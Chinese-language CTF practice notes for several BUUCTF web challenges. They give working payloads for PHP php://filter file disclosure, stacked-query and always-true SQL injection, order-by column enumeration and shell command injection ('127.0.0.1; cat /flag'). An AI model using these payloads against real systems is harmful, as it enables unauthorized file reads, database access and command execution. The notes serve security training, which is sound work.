# CTF Web刷题

## buuctf

### ACTF2020新生赛 include
- 知识点：php伪协议，通过php://filter过滤数据流，并用base64编码获得文件然后解码
- payload
```
/?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```

### SUCTF2019 EasySQL

- 知识点：SQL注入
- 尝试
```
1. 查库
输入 1; show database;
2. 查表
输入 1; show tables;
```
- payload
```
*, 1
```

### 极客大挑战2019 LoveSQL

- 知识点：SQL注入
- 尝试
```
万能密码：
1' or 1=1
```

### ACTF2020新生赛 exec
- 知识点：linux命令堆叠；管道操作符
- 尝试：首先输入一个IP地址观察回显，尝试通过命令操作符拼接
```
通过find命令查找flag文件
payload:127.0.0.1; cat /flag
```

### buu basic  sql course 1
- 知识点：数字型SQL注入
- 尝试：首先需要查找到注入点，通过F12工具并点击不同页面观察网络标签下，可以看到原始url地址，重点是查找=符号，然后观察是数字型注入还是字符型注入
```
id=1 or 1=1 --
```
确定是数字型过滤后，查找表的列数
```
id=1 order by 2;有回显

id=1 order by 3;无回显
```
通过逐次递增列数观察表总共有几列，如果没有回显，则列数确定，接下来观察回显位置

